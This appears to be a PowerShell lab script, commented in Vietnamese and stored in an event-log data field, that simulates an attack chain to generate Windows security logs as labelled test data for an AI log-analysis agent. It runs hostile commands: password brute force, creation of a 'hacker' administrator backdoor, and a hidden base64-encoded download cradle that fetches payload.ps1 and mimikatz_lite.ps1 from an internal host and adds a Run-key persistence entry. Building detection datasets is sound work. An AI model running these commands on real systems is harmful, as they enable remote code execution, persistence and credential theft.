EventData.Data:
# ============================================================================== # SCRIPT CHAY TREN MAY THU NGHIEM / MAY LAB (STANDALONE DEMO RUNNER) # ============================================================================== # Script nay duoc thiet ke de COPY SANG MAY KHAC (VM / May Nan Nhan / May Lab) # Tu dong giu cua so PowerShell mo, KHONG BAO GIO bi tu dong tat. # ==============================================================================
# 1. Kiem tra quyen Administrator $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) if (-not $isAdmin) { Write-Host "====================================================================" -ForegroundColor Red Write-Host " [!] CANH BAO: BAN CHUA MO BANG QUYEN ADMINISTRATOR!" -ForegroundColor Yellow Write-Host " Windows can quyen Administrator de doc Security Event Log (4624, 4625, 4688)." -ForegroundColor White Write-Host "====================================================================" -ForegroundColor Red Write-Host "`n>>> HUONG DAN CHAY:" -ForegroundColor Cyan Write-Host " Click chuot phai vao file 'run_demo.bat' -> Chon 'Run as administrator'`n" -ForegroundColor Yellow cmd.exe /c pause exit }
$ErrorActionPreference = "Continue" $outputDir = "C:\demo"
try { # Tu dong tao thu muc C:\demo neu chua co if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Force -Path $outputDir | Out-Null }
Clear-Host Write-Host "====================================================================" -ForegroundColor Cyan Write-Host " KICH BAN TAO EVENT LOG TAN CONG (CHAY TREN MAY THU NGHIEM) " -ForegroundColor Yellow Write-Host "====================================================================" -ForegroundColor Cyan Write-Host "Thu muc xuat log: $outputDir" -ForegroundColor White Write-Host "====================================================================`n" -ForegroundColor Cyan
# -------------------------------------------------------------------------- # BUOC 0: BAT AUDIT POLICY BAT BUOC TREN WINDOWS # -------------------------------------------------------------------------- Write-Host "[1/4] Dang cau hinh Audit Policy va Logging tren may nay..." -ForegroundColor Cyan
auditpol /set /subcategory:"Logon" /success:enable /failure:enable 2>&1 | Out-Null auditpol /set /subcategory:"Process Creation" /success:enable 2>&1 | Out-Null reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f 2>&1 | Out-Null reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f 2>&1 | Out-Null
Write-Host " -> Da bat Audit Logon (4624/4625), Process Creation (4688), va ScriptBlock (4104)." -ForegroundColor Green
# -------------------------------------------------------------------------- # BUOC 1 DEN 5: MO PHONG CHUOI TAN CONG # -------------------------------------------------------------------------- Write-Host "`n[2/4] Bat dau thuc thi 5 buoc mo phong..." -ForegroundColor Cyan
$startUtc = (Get-Date).ToUniversalTime() $queryStartTime = (Get-Date).AddMinutes(-5)
net user lab_demo P@ssRealDemo2026! /add /y 2>&1 | Out-Null
# --- GIAI DOAN 1: Do mat khau (Event 4625 x 5 lan) --- Write-Host "`n>>> [BUOC 1] Thuc hien Password Brute Force (5 lan sai mat khau)..." -ForegroundColor Yellow $fakePasswords = @("123456", "admin123", "password", "demo2026", "qwerty") foreach ($pass in $fakePasswords) { Write-Host " [+] Thu mat khau '$pass' -> " -NoNewline -ForegroundColor Gray net use \\127.0.0.1 /user:lab_demo $pass 2>&1 | Out-Null Write-Host "DANG NHAP THAT BAI (Sinh Event 4625)" -ForegroundColor Red Start-Sleep -Milliseconds 800 }
# --- GIAI DOAN 2: Dang nhap thanh cong (Event 4624) --- Write-Host "`n>>> [BUOC 2] Dang nhap thanh cong sau chuoi do pass..." -ForegroundColor Green Write-Host " [+] Dang nhap bang mat khau dung -> " -NoNewline -ForegroundColor Gray net use \\127.0.0.1 /user:lab_demo P@ssRealDemo2026! 2>&1 | Out-Null Write-Host "DANG NHAP THANH CONG (Sinh Event 4624)" -ForegroundColor Green Start-Sleep -Seconds 1
# --- GIAI DOAN 3: Trinh sat he thong (Event 4688 whoami) --- Write-Host "`n>>> [BUOC 3] Ke tan cong trinh sat he thong..." -ForegroundColor Cyan Write-Host " [+] Thuc thi: cmd.exe /c whoami" -ForegroundColor Gray cmd.exe /c whoami | Out-Null Start-Sleep -Seconds 1
# --- GIAI DOAN 4: Tao backdoor va leo thang Admin (Event 4688) --- Write-Host "`n>>> [BUOC 4] Tao backdoor va them quyen Admin..." -ForegroundColor Magenta Write-Host " [+] net user hacker P@ssw0rd123! /add" -ForegroundColor Gray cmd.exe /c "net user hacker P@ssw0rd123! /add" 2>&1 | Out-Null Start-Sleep -Seconds 1
Write-Host " [+] net localgroup Administrators hacker /add" -ForegroundColor Gray cmd.exe /c "net localgroup Administrators hacker /add" 2>&1 | Out-Null Start-Sleep -Seconds 1
# --- GIAI DOAN 5: Thuc thi ma doc PowerShell (Event 4688 va 4104) --- Write-Host "`n>>> [BUOC 5] Thuc thi ma doc an va tai payload tu C2..." -ForegroundColor Red $payloadScript = "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1'); Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Updater' -Value 'C:\Windows\Temp\svchost32.exe'; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.50/mimikatz_lite.ps1')" $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript) $encodedCommand = [Convert]::ToBase64String($bytes)
Write-Host " [+] powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand [Base64]" -ForegroundColor Gray Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encodedCommand" Start-Sleep -Seconds 2
# Don dep tai khoan sau khi test net use \\127.0.0.1 /delete /y 2>&1 | Out-Null net user hacker /delete 2>&1 | Out-Null net user lab_demo /delete 2>&1 | Out-Null
$endUtc = (Get-Date).ToUniversalTime()
# -------------------------------------------------------------------------- # BUOC 3: DOI WINDOWS FLUSH LOG # -------------------------------------------------------------------------- Write-Host "`n[3/4] Doi 3 giay de Windows Event Log dong bo du lieu..." -ForegroundColor Yellow Start-Sleep -Seconds 3
# -------------------------------------------------------------------------- # BUOC 4: TRICH XUAT EVENT LOGS RA C:\demo # -------------------------------------------------------------------------- Write-Host "`n[4/4] Dang trich xuat log vao $outputDir..." -ForegroundColor Cyan
# 1. Trich xuat Security Log (4624, 4625, 4688) $rawSec = Get-WinEvent -FilterHashtable @{ LogName = 'Security' Id = 4624, 4625, 4688 StartTime = $queryStartTime } -ErrorAction SilentlyContinue
$secCount = if ($rawSec) { $rawSec.Count } else { 0 } if ($secCount -gt 0) { Write-Host " [V] Security Log : Trich xuat duoc $secCount su kien (4624, 4625, 4688)" -ForegroundColor Green $secXml = "<Events>" + (($rawSec | ForEach-Object { $_.ToXml() }) -join "") + "</Events>" } else { Write-Host " [X] CANH BAO: Khong tim thay su kien Security nao!" -ForegroundColor Red $secXml = "<Events></Events>" } [System.IO.File]::WriteAllText("$outputDir\security.xml", $secXml, [System.Text.Encoding]::UTF8)
# 2. Trich xuat PowerShell Log (4104 ScriptBlock) $rawPs = Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational' Id = 4104 StartTime = $queryStartTime } -ErrorAction SilentlyContinue
$psCount = if ($rawPs) { $rawPs.Count } else { 0 } if ($psCount -gt 0) { Write-Host " [V] PowerShell : Trich xuat duoc $psCount su kien (4104 ScriptBlock)" -ForegroundColor Green $psXml = "<Events>" + (($rawPs | ForEach-Object { $_.ToXml() }) -join "") + "</Events>" } else { Write-Host " [!] PowerShell : Khong co su kien 4104 moi." -ForegroundColor Yellow $psXml = "<Events></Events>" } [System.IO.File]::WriteAllText("$outputDir\powershell.xml", $psXml, [System.Text.Encoding]::UTF8)
# 3. Tao file manifest.json $manifest = @{ case_id = "case_demo" host = $env:COMPUTERNAME start_utc = $startUtc.ToString("yyyy-MM-ddTHH:mm:ssZ") end_utc = $endUtc.ToString("yyyy-MM-ddTHH:mm:ssZ") actions = "5x Brute Force; 1x Logon Success; whoami; net user hacker /add; PowerShell Cradle + Mimikatz" ground_truth = "ALERT" } | ConvertTo-Json -Depth 3 [System.IO.File]::WriteAllText("$outputDir\manifest.json", $manifest, [System.Text.Encoding]::UTF8)
Write-Host "`n====================================================================" -ForegroundColor Green Write-Host " HOAN TAT THANH CONG! " -ForegroundColor Yellow Write-Host "====================================================================" -ForegroundColor Green Write-Host "Da xuat day du 3 file vao thu muc $outputDir :" -ForegroundColor White Write-Host " 1. $outputDir\security.xml" -ForegroundColor Cyan Write-Host " 2. $outputDir\powershell.xml" -ForegroundColor Cyan Write-Host " 3. $outputDir\manifest.json" -ForegroundColor Cyan Write-Host "`n[*] BUOC TIEP THEO:" -ForegroundColor Yellow Write-Host " Copy ca thu muc '$outputDir' nay ve may chay AI Agent va dat vao:" -ForegroundColor White Write-Host " winlog-agent\data\case_demo\" -ForegroundColor Gray Write-Host " Sau do chay: .\.venv\Scripts\python.exe analyze.py --case case_demo --model qwen" -ForegroundColor Cyan Write-Host "====================================================================" -ForegroundColor Green
} catch { Write-Host "`n[!] DA XAY RA LOI TRONG QUA TRINH CHAY: $_" -ForegroundColor Red Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed } finally { Write-Host "`n====================================================================" -ForegroundColor Yellow Write-Host ">>> [HOAN TAT] Tat ca log da duoc luu tai: $outputDir" -ForegroundColor Green Write-Host ">>> Cua so nay se DUOC GIU NGUYEN (KHONG TU DONG DONG)." -ForegroundColor Cyan Write-Host "====================================================================" -ForegroundColor Yellow cmd.exe /c pause }
